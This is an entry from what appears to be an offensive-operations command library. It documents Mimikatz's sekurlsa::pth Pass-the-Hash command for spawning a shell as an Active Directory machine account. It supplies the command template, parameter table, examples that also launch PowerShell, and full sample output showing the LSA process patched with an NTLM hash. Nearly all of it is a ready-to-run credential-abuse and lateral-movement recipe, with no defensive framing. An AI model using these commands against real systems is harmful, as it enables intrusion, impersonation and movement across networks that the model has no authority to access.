---
id: 2b43360e-450c-42ca-8fc7-1a946aacb74a
name: Mimikatz Spawn a Shell as an AD Machine Account
type: command
executor: cmd
data: >-
  Mimikatz.exe "sekurlsa::pth /user:$_MACHINE_NAME$ /domain:$_DOMAIN
  /ntlm:$_NTLM_HASH"
output: >-
  C:\Windows\System32\spool\drivers\color>.\MimiKatz.exe "sekurlsa::pth
  /user:SQLSRV01$ /domain:bank.local /ntlm:374B2539A390DD9781DDF26FD6029F83"

    .#####.   mimikatz 2.2.0 (x64) #18362 May  9 2020 20:52:48
   .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
   ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
   ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
   '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
    '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/


  mimikatz(commandline) # sekurlsa::pth /user:SQLSRV01$ /domain:bank.local
  /ntlm:374B2539A390DD9781DDF26FD6029F83

  user    : SQLSRV01$

  domain  : bank.local

  program : cmd.exe

  impers. : no

  NTLM    : 374B2539A390DD9781DDF26FD6029F83
    |  PID  3724
    |  TID  1836
    |  LSA Process is now R/W
    |  LUID 0 ; 5434326 (00000000:0052ebd6)
    \_ msv1_0   - data copy @ 0000022C33601170 : OK !
    \_ kerberos - data copy @ 0000022C3398A828
     \_ aes256_hmac       -> null
     \_ aes128_hmac       -> null
     \_ rc4_hmac_nt       OK
     \_ rc4_hmac_old      OK
     \_ rc4_md4           OK
     \_ rc4_hmac_nt_exp   OK
     \_ rc4_hmac_old_exp  OK
     \_ *Password replace @ 0000022C339F0128 (32) -> null
created_at: '2020-06-24T23:26:31.434306+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - mimikatz
  - pth
  - lateral-movement
verified: true
validated: true
---

# Mimikatz Spawn a Shell as an AD Machine Account

## Command

```cmd
Mimikatz.exe "sekurlsa::pth /user:$_MACHINE_NAME$ /domain:$_DOMAIN /ntlm:$_NTLM_HASH"
```

## Description

This command uses Mimikatz's sekurlsa::pth module to perform Pass-the-Hash authentication, spawning a new cmd.exe process under the specified Active Directory machine account context. It modifies the LSA process to inject the NTLM hash, enabling impersonation for lateral movement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user:$_MACHINE_NAME$ | Machine account name (e.g., SQLSRV01$) | Yes |
| /domain:$_DOMAIN | Active Directory domain (e.g., bank.local) | Yes |
| /ntlm:$_NTLM_HASH | NTLM hash of the machine account (32 hex characters) | Yes |
| program:cmd.exe | Program to spawn (defaults to cmd.exe if omitted) | No |

## Examples

### Basic Usage

```cmd
Mimikatz.exe "sekurlsa::pth /user:WORKSTATION01$ /domain:corp.local /ntlm:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0"
```

### Advanced Usage

Specify a different program:

```cmd
Mimikatz.exe "sekurlsa::pth /user:SQLSRV01$ /domain:bank.local /ntlm:374B2539A390DD9781DDF26FD6029F83 /run:"powershell.exe"
```

## Expected Output

```
C:\Windows\System32\spool\drivers\color> .\MimiKatz.exe "sekurlsa::pth /user:SQLSRV01$ /domain:bank.local /ntlm:374B2539A390DD9781DDF26FD6029F83"

  .#####.   mimikatz 2.2.0 (x64) #18362 May  9 2020 20:52:48
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/


mimikatz(commandline) # sekurlsa::pth /user:SQLSRV01$ /domain:bank.local /ntlm:374B2539A390DD9781DDF26FD6029F83
user    : SQLSRV01$
domain  : bank.local
program : cmd.exe
impers. : no
NTLM    : 374B2539A390DD9781DDF26FD6029F83
  |  PID  3724
  |  TID  1836
  |  LSA Process is now R/W
  |  LUID 0 ; 5434326 (00000000:0052ebd6)
  \_ msv1_0   - data copy @ 0000022C33601170 : OK !
  \_ kerberos - data copy @ 0000022C3398A828
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000022C339F0128 (32) -> null
```

A new command prompt window opens running as the machine account. Verify with `whoami` showing the machine$ account.

## Related

- [[commands/Mimikatz-Enable-Debug-Privileges]]
- [[procedures/Execute-Commands-with-an-Active-Directory-Machine-Account]]
